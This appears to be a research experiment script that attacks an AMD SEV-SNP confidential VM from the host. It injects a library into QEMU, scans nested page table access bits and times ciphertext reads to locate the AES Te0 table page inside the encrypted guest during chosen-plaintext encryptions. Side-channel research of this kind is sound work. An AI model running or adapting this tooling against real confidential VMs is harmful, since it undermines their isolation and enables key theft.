#!/usr/bin/env python3
from __future__ import annotations

import argparse
import csv
import json
import os
import re
import socket
import struct
import subprocess
import time
from pathlib import Path
from typing import Callable

from ch5_common import collect_host_facts, timestamped_outdir_ch5, write_json, write_lines
from experiment_common import (
    GUEST_KERNEL,
    INITRAMFS,
    OVMF_FD,
    QEMU_BIN,
    SRC_DIR,
    chown_to_sudo_user,
    ensure_artifacts,
    print_banner,
    require_root,
    stop_proc,
)


PAGE_SZ = 4096
PRIVATE_ALIAS_BASE = 1 << 32
KVM_AMD_NPT_ACCESS_F_FLUSH_TLB = 1 << 0
NPTCTL_MAGIC = 0x4E505443  # "NPTC"
NPTCTL_CMD_PING = 1
NPTCTL_CMD_GPA_TO_HPA = 2
NPTCTL_CMD_READ_GPA = 3
NPTCTL_CMD_NPT_CLEAR = 4
NPTCTL_CMD_NPT_SCAN = 5
FMT_NPTCTL_REQ = "<IHHQQQQ"
FMT_NPTCTL_RESP = "<IHHiiQQQQ"
NPTCTL_SCAN_MAX_ENTRIES = 1 << 20


class NptCtlClient:
    def __init__(self, sock_path: Path, timeout_s: float = 3.0) -> None:
        self.sock_path = Path(sock_path)
        self.timeout_s = timeout_s
        self.sock: socket.socket | None = None

    def connect(self) -> None:
        if self.sock is not None:
            return
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(self.timeout_s)
        s.connect(str(self.sock_path))
        self.sock = s

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def _recv_exact(self, n: int) -> bytes:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        out = b""
        while len(out) < n:
            chunk = self.sock.recv(n - len(out))
            if not chunk:
                raise RuntimeError("nptctl socket closed")
            out += chunk
        return out

    def _request(self, cmd: int, a: int = 0, b: int = 0, c: int = 0, d: int = 0) -> tuple[int, int, int, int, int, int, int, int]:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        req = struct.pack(FMT_NPTCTL_REQ, NPTCTL_MAGIC, cmd, 0, a, b, c, d)
        self.sock.sendall(req)
        resp_raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
        magic, cmd_r, status, sys_errno, kret, v0, v1, v2, v3 = struct.unpack(FMT_NPTCTL_RESP, resp_raw)
        if magic != NPTCTL_MAGIC or cmd_r != cmd:
            raise RuntimeError(f"nptctl bad response: magic=0x{magic:x} cmd={cmd_r} expect={cmd}")
        if status != 0:
            raise OSError(sys_errno if sys_errno != 0 else 5, os.strerror(sys_errno if sys_errno != 0 else 5))
        return (kret, v0, v1, v2, v3, status, sys_errno, cmd_r)

    def ping(self) -> None:
        self._request(NPTCTL_CMD_PING)

    def npt_clear(self, gpa_start: int, gpa_end: int, flags: int) -> dict[str, int]:
        kret, v0, v1, _v2, _v3, _status, _errno, _cmd = self._request(
            NPTCTL_CMD_NPT_CLEAR, gpa_start, gpa_end, flags, 0
        )
        return {
            "gpa_start": int(gpa_start),
            "gpa_end": int(gpa_end),
            "flags": int(flags),
            "pages_scanned": int(v0),
            "pages_cleared": int(v1),
            "ret": int(kret),
        }

    def npt_scan(self, gpa_start: int, gpa_end: int, max_entries: int) -> dict[str, object]:
        kret, v0, v1, v2, _v3, _status, _errno, _cmd = self._request(
            NPTCTL_CMD_NPT_SCAN, gpa_start, gpa_end, max_entries, 0
        )
        entries_written = int(v0)
        pages_scanned = int(v1)
        pages_accessed = int(v2)
        raw = self._recv_exact(entries_written * 8) if entries_written > 0 else b""
        pages = list(struct.unpack(f"<{entries_written}Q", raw)) if entries_written > 0 else []
        return {
            "gpa_start": int(gpa_start),
            "gpa_end": int(gpa_end),
            "max_entries": int(max_entries),
            "entries_written": entries_written,
            "pages_scanned": pages_scanned,
            "pages_accessed": pages_accessed,
            "ret": int(kret),
            "pages": pages,
        }

    def read_gpa_tsc(self, gpa: int, mode: int = 4) -> int:
        """Read GPA and return TSC cycles. Mode 4 = CIPHERTEXT_CACHEABLE"""
        kret, v0, _v1, _v2, _v3, _status, _errno, _cmd = self._request(
            NPTCTL_CMD_READ_GPA, gpa, mode, 0, 0
        )
        if int(kret) != 0:
            raise RuntimeError(f"read_gpa_tsc failed: ret={int(kret)} gpa=0x{gpa:x}")
        return int(v0)


def parse_u64(raw: str) -> int:
    s = raw.strip()
    if s.lower().startswith("0x"):
        return int(s, 16)
    return int(s, 10)


def parse_mem_to_bytes(raw: str) -> int:
    s = raw.strip().upper()
    m = re.fullmatch(r"([0-9]+)([KMG]?)", s)
    if not m:
        raise ValueError(f"invalid --mem value: {raw}")
    n = int(m.group(1))
    unit = m.group(2)
    if unit == "K":
        return n * 1024
    if unit == "M":
        return n * 1024 * 1024
    if unit == "G":
        return n * 1024 * 1024 * 1024
    return n


def recv_exact(sock: socket.socket, n: int) -> bytes:
    """Receive exactly n bytes from socket"""
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            break
        data += chunk
    return data


def aes_request(host: str, port: int, plaintext: bytes, timeout_s: float) -> bytes:
    """Send plaintext to AES service and receive ciphertext"""
    if len(plaintext) != 16:
        raise ValueError("plaintext must be exactly 16 bytes")
    with socket.create_connection((host, port), timeout=timeout_s) as s:
        s.sendall(plaintext)
        out = recv_exact(s, 16)
    if len(out) != 16:
        raise RuntimeError(f"AES service short response: got={len(out)} bytes")
    return out


def default_scan_end_for_mem(mem_bytes: int) -> int:
    # For SNP private mappings we may observe a mirrored GPA window above 4GB
    # (e.g. te0_gpa around 0x101xxxxxx with mem=4G). By default, cover both.
    if mem_bytes <= PRIVATE_ALIAS_BASE:
        return PRIVATE_ALIAS_BASE + mem_bytes
    return mem_bytes


def recv_exact(sock: socket.socket, n: int) -> bytes:
    out = b""
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            break
        out += chunk
    return out


def aes_request(host: str, port: int, plaintext: bytes, timeout_s: float) -> bytes:
    if len(plaintext) != 16:
        raise ValueError("plaintext must be 16 bytes")
    with socket.create_connection((host, port), timeout=timeout_s) as s:
        s.sendall(plaintext)
        out = recv_exact(s, 16)
    if len(out) != 16:
        raise RuntimeError(f"AES service short response: {len(out)} bytes")
    return out


def wait_tcp_ready(host: str, port: int, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1.0):
                return True
        except OSError:
            time.sleep(0.5)
    return False


def evaluate_input_correlation(
    npt: NptCtlClient,
    page_gpa: int,
    te0_inpage_offset: int,
    host: str,
    aes_port: int,
    sock_timeout_s: float,
    reps: int = 4,
) -> dict[str, object]:
    """
    输入相关性分析：Te0的访问模式应该和plaintext[0]相关

    测试策略：
    1. 发送不同的明文（plaintext[0]不同）
    2. 测量页面内不同cache line的timing
    3. Te0应该在plaintext[0]对应的cache line显示强信号
    4. 其他页面（代码、Te1/Te2/Te3）的访问模式更均匀

    返回correlation_score：方差越大说明访问模式越随输入变化
    """
    import statistics

    # 测试4种不同的输入模式
    test_inputs = [
        (b'\x00' * 16, 0),    # plaintext[0]=0 → Te0[0]
        (b'\x55' * 16, 85),   # plaintext[0]=85 → Te0[85]
        (b'\xaa' * 16, 170),  # plaintext[0]=170 → Te0[170]
        (b'\xff' * 16, 255),  # plaintext[0]=255 → Te0[255]
    ]

    # 对每个输入，测量所有64条cache line的timing
    line_timings = {i: [] for i in range(64)}

    for plaintext, byte_val in test_inputs:
        for rep in range(reps):
            try:
                # 触发AES加密
                _ = aes_request(host, aes_port, plaintext, sock_timeout_s)

                # 测量所有cache line
                for line_idx in range(64):
                    line_gpa = (page_gpa & ~(PAGE_SZ - 1)) + line_idx * 64
                    timing = npt.read_gpa_tsc(line_gpa, mode=4)
                    line_timings[line_idx].append(timing)
            except Exception:
                continue

    # 计算每条cache line的方差
    # Te0应该显示：某些line的timing随输入变化很大（方差大）
    # 其他页面：所有line的timing都比较稳定（方差小）
    line_variances = []
    for line_idx in range(64):
        timings = line_timings[line_idx]
        if len(timings) >= 8:
            var = statistics.variance(timings) if len(timings) > 1 else 0.0
            line_variances.append(var)

    if not line_variances:
        return {
            "page_gpa": page_gpa,
            "correlation_score": 0.0,
            "max_variance": 0.0,
            "avg_variance": 0.0,
        }

    max_variance = max(line_variances)
    avg_variance = statistics.mean(line_variances)

    # Correlation score: 使用归一化的指标
    # 计算最大方差与平均方差的比值（SNR-like metric）
    # Te0: 某些line方差很大，其他line方差小 → 比值大
    # 其他页面: 所有line方差都小或都大 → 比值接近1
    if avg_variance > 0:
        correlation_score = max_variance / avg_variance
    else:
        correlation_score = 0.0

    return {
        "page_gpa": page_gpa,
        "correlation_score": correlation_score,
        "max_variance": max_variance,
        "avg_variance": avg_variance,
        "line_count": len(line_variances),
    }


def evaluate_page_coherence(
    npt: NptCtlClient,
    page_gpa: int,
    te0_inpage_offset: int,
    host: str,
    aes_port: int,
    sock_timeout_s: float,
    reps: int = 16,
    test_lines: list[int] | None = None,
) -> dict[str, object]:
    """
    增强的coherence评估：
    1. 测试更多cache line（默认16条，可选全部64条）
    2. 增加重复次数（默认16次）
    3. 计算更多统计量（SNR, 标准差等）

    返回:
        max_delta: 最大时延差异（cycles）
        avg_delta: 平均时延差异
        snr: 信噪比（delta/noise）
        line_deltas: 每条line的delta
    """
    import statistics

    if test_lines is None:
        # 增强采样：16条line覆盖整个4KB页面
        test_lines = [0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60]

    line_deltas: list[float] = []
    line_snrs: list[float] = []

    for line_idx in test_lines:
        line_gpa = (page_gpa & ~(PAGE_SZ - 1)) + line_idx * 64

        h0_samples: list[int] = []
        h1_samples: list[int] = []

        for _ in range(reps):
            # Baseline: 不触发AES
            try:
                t0 = npt.read_gpa_tsc(line_gpa, mode=4)  # CIPHERTEXT_CACHEABLE
                h0_samples.append(t0)
            except Exception:
                continue

            # Trigger: 触发AES
            try:
                _ = aes_request(host, aes_port, os.urandom(16), sock_timeout_s)
                t1 = npt.read_gpa_tsc(line_gpa, mode=4)
                h1_samples.append(t1)
            except Exception:
                continue

        if len(h0_samples) >= 8 and len(h1_samples) >= 8:
            h0_median = statistics.median(h0_samples)
            h1_median = statistics.median(h1_samples)
            h0_std = statistics.stdev(h0_samples) if len(h0_samples) > 1 else 1.0

            delta = h1_median - h0_median
            snr = delta / h0_std if h0_std > 0 else 0.0

            line_deltas.append(delta)
            line_snrs.append(snr)

    if not line_deltas:
        return {
            "page_gpa": page_gpa,
            "max_delta": 0.0,
            "avg_delta": 0.0,
            "max_snr": 0.0,
            "coherence_score": 0.0,
            "line_count": 0,
        }

    max_delta = max(line_deltas)
    avg_delta = statistics.mean(line_deltas)
    max_snr = max(line_snrs) if line_snrs else 0.0

    # Coherence score: 使用SNR作为主要指标（更稳定）
    coherence_score = max_snr

    return {
        "page_gpa": page_gpa,
        "max_delta": max_delta,
        "avg_delta": avg_delta,
        "max_snr": max_snr,
        "coherence_score": coherence_score,
        "line_count": len(line_deltas),
        "line_deltas": line_deltas,
    }


def verify_multiple_candidates(
    npt: NptCtlClient,
    candidate_clusters: list[list[int]],
    te0_inpage_offset: int,
    host: str,
    aes_port: int,
    sock_timeout_s: float,
    ranking: list[dict[str, int]],
    max_candidates: int = 10,
) -> dict[str, object]:
    """
    组合策略的验证：
    1. 增加测试的cluster数量到10个（原来5个）
    2. 对每个簇的代表页面进行输入相关性分析
    3. 综合相关性和coherence选择最佳候选
    """
    results: list[dict[str, object]] = []

    print(f"[verify] Testing {min(len(candidate_clusters), max_candidates)} candidate clusters...")

    for i, cluster in enumerate(candidate_clusters[:max_candidates]):
        print(f"[verify] Cluster {i+1}/{min(len(candidate_clusters), max_candidates)}: {len(cluster)} pages, "
              f"range=0x{cluster[0]:x}-0x{cluster[-1]:x}")

        # 选择簇的代表页面：中心页面
        center_idx = len(cluster) // 2
        representative_page = cluster[center_idx]

        te0_gpa = representative_page + te0_inpage_offset

        try:
            # 输入相关性分析（最重要）
            correlation = evaluate_input_correlation(
                npt, representative_page, te0_inpage_offset, host, aes_port, sock_timeout_s, reps=4
            )

            # Coherence测试（辅助）
            coherence = evaluate_page_coherence(
                npt, representative_page, te0_inpage_offset, host, aes_port, sock_timeout_s, reps=8
            )

            correlation_score = correlation["correlation_score"]
            coherence_snr = coherence.get("max_snr", 0.0)

            results.append({
                "cluster_id": i,
                "cluster_size": len(cluster),
                "representative_page": representative_page,
                "te0_gpa": te0_gpa,
                "correlation_score": correlation_score,
                "max_variance": correlation["max_variance"],
                "coherence_snr": coherence_snr,
                "max_delta": coherence["max_delta"],
                "cluster_pages": cluster,
            })

            print(f"  representative=0x{representative_page:x} correlation={correlation_score:.1f} "
                  f"coherence_snr={coherence_snr:.2f}")

        except Exception as e:
            print(f"  representative=0x{representative_page:x} ERROR: {e}")
            results.append({
                "cluster_id": i,
                "cluster_size": len(cluster),
                "representative_page": representative_page,
                "te0_gpa": te0_gpa,
                "correlation_score": 0.0,
                "coherence_snr": 0.0,
                "error": str(e),
                "cluster_pages": cluster,
            })

    # 综合评分：coherence为主，correlation为辅，并惩罚大cluster，奖励baseline_is_1
    # 实验发现：
    # 1. coherence SNR是更可靠的指标 (Oracle: coh=26.22 rank 7, corr=10.39 rank 21)
    # 2. 大clusters (size>10) 的correlation虚高，但不可能是Te0
    # 3. baseline_is_1是Te0的独特特征（唯一满足的cluster）
    for r in results:
        coherence_snr = r.get("coherence_snr", 0.0)
        correlation_score = r.get("correlation_score", 0.0)
        cluster_size = r.get("cluster_size", 1)
        cluster_pages = r.get("cluster_pages", [])

        # Collect page statistics
        baseline_hits = []
        trigger_hits = []
        scores = []
        for page_gpa in cluster_pages:
            # Find page in ranking
            for row in ranking:
                if row['page_gpa'] == page_gpa:
                    baseline_hits.append(row['baseline_hits'])
                    trigger_hits.append(row['trigger_hits'])
                    scores.append(row['score'])
                    break

        # Feature 1: Baseline consistency (主要特征)
        baseline_consistent = len(set(baseline_hits)) == 1 if baseline_hits else False

        # Feature 2: Score consistency (辅助特征)
        score_consistent = len(set(scores)) == 1 if scores else False

        # Feature 3: Low baseline ratio (辅助特征)
        avg_baseline = sum(baseline_hits) / len(baseline_hits) if baseline_hits else 0
        avg_trigger = sum(trigger_hits) / len(trigger_hits) if trigger_hits else 1
        baseline_ratio = avg_baseline / avg_trigger if avg_trigger > 0 else 1.0

        # Feature 4: Baseline value (新特征 - 非常重要!)
        # Oracle通常有baseline_value > 0 (例如1, 2, 3)
        # False positives通常baseline_value = 0
        baseline_value = baseline_hits[0] if baseline_hits else 0

        # Size penalty: Te0只有1KB (4页)，大cluster不可能是Te0
        if cluster_size > 10:
            size_penalty = 0.5  # 大cluster降低50%
        elif cluster_size > 6:
            size_penalty = 0.8  # 中等cluster降低20%
        else:
            size_penalty = 1.0  # 小cluster (4-6页) 不惩罚

        # Multi-feature bonus system
        bonus = 0.0

        # Bonus 1: Baseline consistency (最强特征)
        if baseline_consistent and 4 <= cluster_size <= 10:
            bonus += 30.0

        # Bonus 2: Score consistency (辅助特征)
        if score_consistent and 4 <= cluster_size <= 10:
            bonus += 10.0

        # Bonus 3: Low baseline ratio (辅助特征)
        if baseline_ratio < 0.05 and 4 <= cluster_size <= 10:
            bonus += 5.0

        # Bonus 4: Baseline value > 0 (关键区分特征!)
        # 这个特征可以区分真正的Te0和false positives
        if baseline_value > 0 and baseline_consistent and 4 <= cluster_size <= 10:
            bonus += 20.0

        # 方案4: 降低coherence权重，让bonus的影响更大
        # 原因: 当多个候选都满足所有特征时，coherence的小差异不应该决定性地影响结果
        # 新权重: coherence 30% + correlation 40% (降低coherence从60%到30%)
        base_score = coherence_snr * 0.3 + correlation_score * 0.4

        # Outlier detection: cap coherence SNR at reasonable value
        # 正常的coherence SNR应该在0-100范围内
        # 超过100的值很可能是测量噪声
        capped_coherence = min(coherence_snr, 100.0)
        capped_base_score = capped_coherence * 0.3 + correlation_score * 0.4

        r["combined_score"] = capped_base_score * size_penalty + bonus

        # Store features for debugging
        r["baseline_consistent"] = baseline_consistent
        r["score_consistent"] = score_consistent
        r["baseline_ratio"] = baseline_ratio
        r["baseline_value"] = baseline_value

    # 方案3: 硬性过滤 - 只保留baseline_value > 0的候选
    # 理由: baseline_value=0意味着在100轮baseline中从未被访问
    # 但真正的Te0会被AES_set_encrypt_key()访问，所以应该有baseline_value > 0
    print(f"\n[verify] 过滤前候选数: {len(results)}")
    filtered_results = [r for r in results if r.get("baseline_value", 0) > 0]
    print(f"[verify] 过滤后候选数 (baseline_value > 0): {len(filtered_results)}")

    if not filtered_results:
        print("[verify] 警告: 所有候选的baseline_value都为0，回退到未过滤结果")
        filtered_results = results

    filtered_results.sort(key=lambda x: x.get("combined_score", 0.0), reverse=True)
    results = filtered_results  # 使用过滤后的结果

    if not results or results[0].get("combined_score", 0.0) <= 0:
        return {
            "success": False,
            "best_page": None,
            "all_results": results,
        }

    best = results[0]

    print(f"\n[verify] Best cluster: #{best['cluster_id']+1}, size={best['cluster_size']}, "
          f"page=0x{best['representative_page']:x}, "
          f"correlation={best['correlation_score']:.1f}, coherence_snr={best['coherence_snr']:.2f}, "
          f"combined_score={best['combined_score']:.2f}")

    # 输出Top-3候选供参考
    print(f"\n[verify] Top-3 candidates:")
    for i in range(min(3, len(results))):
        r = results[i]
        print(f"  #{i+1} Cluster {r['cluster_id']}, size={r['cluster_size']}, "
              f"page=0x{r['representative_page']:x}, "
              f"baseline_value={r.get('baseline_value', 0)}, "
              f"score={r['combined_score']:.2f}")

    return {
        "success": True,
        "best_page": best["representative_page"],
        "best_te0_gpa": best["te0_gpa"],
        "best_correlation": best["correlation_score"],
        "best_coherence_snr": best["coherence_snr"],
        "best_combined_score": best["combined_score"],
        "best_cluster_size": best["cluster_size"],
        "best_cluster_pages": best["cluster_pages"],
        "all_results": results,
    }


def wait_vm_ready(host: str, aes_port: int, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            _ = aes_request(host, aes_port, b"\x00" * 16, timeout_s=1.5)
            return True
        except Exception:
            pass
        time.sleep(1.0)
    return False


def resolve_path_with_fallback(default_path: Path, fallback_path: Path) -> Path:
    if default_path.exists():
        return default_path
    if fallback_path.exists():
        return fallback_path
    return default_path


def make_affinity_preexec(cpu: int) -> Callable[[], None] | None:
    if cpu < 0:
        return None

    def _fn() -> None:
        os.sched_setaffinity(0, {cpu})

    return _fn


def qemu_netdev_backends(qemu_bin: Path) -> set[str]:
    cp = subprocess.run(
        [str(qemu_bin), "-netdev", "help"],
        capture_output=True,
        text=True,
        check=False,
    )
    out = (cp.stdout or "") + "\n" + (cp.stderr or "")
    backs: set[str] = set()
    for line in out.splitlines():
        s = line.strip()
        if not s or s.endswith(":"):
            continue
        if " " in s or "\t" in s:
            continue
        backs.add(s)
    return backs


def create_tap_interface(ifname: str, host_ip: str) -> None:
    cmds = [
        ["ip", "tuntap", "add", "dev", ifname, "mode", "tap"],
        ["ip", "addr", "add", f"{host_ip}/24", "dev", ifname],
        ["ip", "link", "set", ifname, "up"],
    ]
    for cmd in cmds:
        cp = subprocess.run(cmd, capture_output=True, text=True, check=False)
        if cp.returncode != 0:
            raise RuntimeError(f"tap setup failed: {' '.join(cmd)}: {cp.stderr.strip()}")


def remove_tap_interface(ifname: str) -> None:
    subprocess.run(["ip", "link", "set", ifname, "down"], check=False)
    subprocess.run(["ip", "tuntap", "del", "dev", ifname, "mode", "tap"], check=False)


def resolve_te0_symbol_bin(user_path: str) -> Path:
    candidates: list[Path] = []
    if user_path.strip():
        candidates.append(Path(user_path).expanduser())
    candidates.extend(
        [
            SRC_DIR / "build" / "guest_victim_aes",
            SRC_DIR / "build" / "openssl_noasm" / "libcrypto.a",
            Path("/opt/openssl-noasm/lib/libcrypto.so"),
        ]
    )
    seen: set[str] = set()
    uniq: list[Path] = []
    for p in candidates:
        k = str(p.resolve() if p.is_absolute() else p)
        if k in seen:
            continue
        seen.add(k)
        uniq.append(p)
    for p in uniq:
        if p.exists():
            return p
    tried = "\n".join(f"  - {p}" for p in uniq)
    raise SystemExit("[seed] te0 symbol binary not found; tried:\n" + tried)


def wait_nptctl_ready(sock_path: Path, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        if sock_path.exists():
            cli = NptCtlClient(sock_path=sock_path, timeout_s=1.5)
            try:
                cli.connect()
                cli.ping()
                cli.close()
                return True
            except Exception:
                cli.close()
        time.sleep(0.3)
    return False


def parse_te0_symbol_vma(symbol_bin: Path) -> int:
    cp = subprocess.run(["nm", "-A", str(symbol_bin)], capture_output=True, text=True, check=False)
    if cp.returncode != 0:
        raise RuntimeError(f"nm failed on {symbol_bin}: {cp.stderr.strip()}")
    m = re.search(r":([0-9a-fA-F]+)\s+[A-Za-z]\s+Te0$", cp.stdout, flags=re.M)
    if not m:
        raise RuntimeError(f"cannot find symbol Te0 in {symbol_bin}")
    return int(m.group(1), 16)


def parse_load_segments(symbol_bin: Path) -> list[tuple[int, int, int]]:
    cp = subprocess.run(["readelf", "-W", "-l", str(symbol_bin)], capture_output=True, text=True, check=False)
    if cp.returncode != 0:
        return []
    segs: list[tuple[int, int, int]] = []
    pat = re.compile(r"^\s*LOAD\s+0x([0-9a-fA-F]+)\s+0x([0-9a-fA-F]+)\s+0x[0-9a-fA-F]+\s+0x([0-9a-fA-F]+)")
    for line in cp.stdout.splitlines():
        m = pat.match(line)
        if not m:
            continue
        off = int(m.group(1), 16)
        vaddr = int(m.group(2), 16)
        memsz = int(m.group(3), 16)
        segs.append((off, vaddr, memsz))
    return segs


def compute_te0_offset(symbol_bin: Path) -> dict[str, int]:
    te0_vma = parse_te0_symbol_vma(symbol_bin)
    segs = parse_load_segments(symbol_bin)
    te0_file_off = te0_vma
    for off, vaddr, memsz in segs:
        if vaddr <= te0_vma < (vaddr + memsz):
            te0_file_off = off + (te0_vma - vaddr)
            break
    return {
        "te0_vma": te0_vma,
        "te0_file_offset": te0_file_off,
        "te0_inpage_offset": te0_file_off & (PAGE_SZ - 1),
    }


def launch_reference_vm(
    args: argparse.Namespace, vm_dir: Path
) -> tuple[subprocess.Popen, str, str, Callable[[], None] | None, Path]:
    qemu_bin = resolve_path_with_fallback(
        QEMU_BIN, Path("<COHERE_REPO>/AMDSEV/qemu/build/qemu-system-x86_64")
    )
    ovmf_fd = resolve_path_with_fallback(
        OVMF_FD, Path("<COHERE_REPO>/AMDSEV/ovmf/Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd")
    )
    if not qemu_bin.exists():
        raise SystemExit(f"[env] QEMU binary not found: {qemu_bin}")
    if not ovmf_fd.exists():
        raise SystemExit(f"[env] OVMF not found: {ovmf_fd}")
    if not GUEST_KERNEL.exists():
        raise SystemExit(f"[env] guest kernel missing: {GUEST_KERNEL}")
    if not INITRAMFS.exists():
        raise SystemExit(f"[env] initramfs missing: {INITRAMFS}")

    base_parts = [
        "console=ttyS0",
        "rdinit=/init",
        "panic=-1",
        "quiet",
        "probe_mode=victim_services",
    ]
    extra_cmdline = str(getattr(args, "guest_extra_cmdline", "")).strip()
    if extra_cmdline:
        base_parts.append(extra_cmdline)
    append_base = " ".join(base_parts)
    netdevs = qemu_netdev_backends(qemu_bin)
    net_mode = args.net_mode
    if net_mode == "auto":
        net_mode = "user" if "user" in netdevs else "tap"

    net_args: list[str]
    runtime_host = args.host
    cleanup: Callable[[], None] | None = None
    if net_mode == "user":
        if "user" not in netdevs:
            raise SystemExit(
                f"[seed] qemu has no user net backend. available={sorted(netdevs)}; "
                "use --net-mode tap or rebuild qemu with slirp."
            )
        append = append_base + " ip=10.0.2.15::10.0.2.2:255.255.255.0::eth0:off"
        net_args = [
            "-netdev",
            f"user,id=net0,hostfwd=tcp::{args.aes_port}-:9000,hostfwd=tcp::{args.rsa_port}-:9001",
            "-device",
            "virtio-net-pci,netdev=net0",
        ]
    elif net_mode == "tap":
        if "tap" not in netdevs:
            raise SystemExit(
                f"[seed] qemu has no tap net backend. available={sorted(netdevs)}."
            )
        tap_if = args.tap_ifname.strip() if args.tap_ifname.strip() else f"tap53s{os.getpid() % 10000}"
        create_tap_interface(tap_if, args.tap_host_ip)
        cleanup = lambda: remove_tap_interface(tap_if)
        append = append_base + f" ip={args.tap_guest_ip}::{args.tap_host_ip}:255.255.255.0::eth0:off"
        net_args = [
            "-netdev",
            f"tap,id=net0,ifname={tap_if},script=no,downscript=no",
            "-device",
            "virtio-net-pci,netdev=net0",
        ]
        runtime_host = args.tap_guest_ip if args.host == "127.0.0.1" else args.host
    else:
        raise SystemExit(f"[seed] invalid --net-mode: {args.net_mode}")

    npt_sock = vm_dir / "nptctl.sock"
    preload_env = os.environ.copy()
    preload_env.update(
        {
            "HR_MODE": "nptctl",
            "HR_OUTDIR": str(vm_dir),
            "HR_NPT_SOCK": str(npt_sock),
            "HR_CPU": str(args.qemu_cpu),
            "LD_PRELOAD": str(SRC_DIR / "build" / "libhost_runner.so"),
        }
    )
    (vm_dir / ".hr_preload.lock").unlink(missing_ok=True)

    qemu_cmd = [
        str(qemu_bin),
        "-enable-kvm",
        "-cpu",
        args.cpu_model,
        "-machine",
        "q35,smm=off",
        "-machine",
        "confidential-guest-support=sev0,vmport=off",
        "-machine",
        "memory-backend=ram1",
        "-smp",
        str(args.smp),
        "-m",
        str(args.mem),
        "-no-reboot",
        "-object",
        f"memory-backend-memfd,id=ram1,size={args.mem},share=true,prealloc=false",
        "-object",
        "sev-snp-guest,id=sev0,policy=0x30000,cbitpos=51,reduced-phys-bits=1",
        "-bios",
        str(ovmf_fd),
        "-kernel",
        str(GUEST_KERNEL),
        "-initrd",
        str(INITRAMFS),
        "-append",
        append,
        "-serial",
        f"file:{vm_dir / 'qemu_console.log'}",
        *net_args,
        "-nographic",
    ]
    print(f"[seed] qemu_bin={qemu_bin}")
    print(f"[seed] ovmf_fd={ovmf_fd}")
    print(f"[seed] qemu_mem={args.mem}")
    print(f"[seed] net_mode={net_mode} host_for_trigger={runtime_host}")
    print(f"[seed] cmd={' '.join(qemu_cmd)}")

    qlog = (vm_dir / "qemu.log").open("w")
    proc = subprocess.Popen(
        qemu_cmd,
        cwd=str(SRC_DIR),
        env=preload_env,
        stdin=subprocess.DEVNULL,
        stdout=qlog,
        stderr=subprocess.STDOUT,
        preexec_fn=make_affinity_preexec(args.qemu_cpu),
        start_new_session=True,
    )
    return proc, runtime_host, net_mode, cleanup, npt_sock


def npt_discovery(
    npt: NptCtlClient,
    args: argparse.Namespace,
    scan_start_gpa: int,
    scan_end_gpa: int,
    outdir: Path,
) -> list[dict[str, int]]:
    disc_dir = outdir / "npt_seed"
    disc_dir.mkdir(parents=True, exist_ok=True)
    rounds_csv = disc_dir / "seed_rounds.csv"

    pages_per_range = max(1, (scan_end_gpa - scan_start_gpa) // PAGE_SZ)
    max_entries = max(512, min(NPTCTL_SCAN_MAX_ENTRIES, pages_per_range))
    trig_hits: dict[int, int] = {}
    base_hits: dict[int, int] = {}

    with rounds_csv.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(
            [
                "round",
                "baseline_pages",
                "trigger_pages",
                "new_pages_after_trigger",
                "clear_pages_scanned",
                "clear_pages_cleared",
            ]
        )

        for r in range(args.discover_rounds):
            clear1 = npt.npt_clear(
                scan_start_gpa,
                scan_end_gpa,
                KVM_AMD_NPT_ACCESS_F_FLUSH_TLB,
            )
            if clear1["ret"] != 0:
                raise RuntimeError(f"NPT clear failed(ret={clear1['ret']}) round={r}")

            time.sleep(args.baseline_wait_ms / 1000.0)
            base = npt.npt_scan(scan_start_gpa, scan_end_gpa, max_entries=max_entries)
            if base["ret"] != 0:
                raise RuntimeError(f"NPT baseline scan failed(ret={base['ret']}) round={r}")
            base_pages = set((int(p) & ~(PAGE_SZ - 1)) for p in base["pages"])

            clear2 = npt.npt_clear(
                scan_start_gpa,
                scan_end_gpa,
                KVM_AMD_NPT_ACCESS_F_FLUSH_TLB,
            )
            if clear2["ret"] != 0:
                raise RuntimeError(f"NPT clear before trigger failed(ret={clear2['ret']}) round={r}")

            for _ in range(args.trigger_requests_per_round):
                _ = aes_request(args.host, args.aes_port, os.urandom(16), timeout_s=args.sock_timeout_s)

            trig = npt.npt_scan(scan_start_gpa, scan_end_gpa, max_entries=max_entries)
            if trig["ret"] != 0:
                raise RuntimeError(f"NPT trigger scan failed(ret={trig['ret']}) round={r}")
            trig_pages = set((int(p) & ~(PAGE_SZ - 1)) for p in trig["pages"])

            for p in base_pages:
                base_hits[p] = base_hits.get(p, 0) + 1
            for p in trig_pages:
                trig_hits[p] = trig_hits.get(p, 0) + 1

            wr.writerow(
                [
                    r,
                    len(base_pages),
                    len(trig_pages),
                    len(trig_pages - base_pages),
                    clear2["pages_scanned"],
                    clear2["pages_cleared"],
                ]
            )

    ranking: list[dict[str, int]] = []
    all_pages = sorted(set(trig_hits.keys()) | set(base_hits.keys()))
    for p in all_pages:
        t = trig_hits.get(p, 0)
        b = base_hits.get(p, 0)
        ranking.append(
            {
                "page_gpa": p,
                "trigger_hits": t,
                "baseline_hits": b,
                "score": t - b,
            }
        )
    ranking.sort(key=lambda it: (it["score"], it["trigger_hits"], -it["baseline_hits"]), reverse=True)

    with (disc_dir / "seed_page_ranking.csv").open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(["rank", "page_gpa", "score", "trigger_hits", "baseline_hits"])
        for i, row in enumerate(ranking, start=1):
            wr.writerow([i, f"0x{row['page_gpa']:x}", row["score"], row["trigger_hits"], row["baseline_hits"]])

    write_json(
        disc_dir / "seed_page_ranking.json",
        {
            "scan_start_gpa": f"0x{scan_start_gpa:x}",
            "scan_end_gpa": f"0x{scan_end_gpa:x}",
            "ranking": ranking,
        },
    )
    return ranking


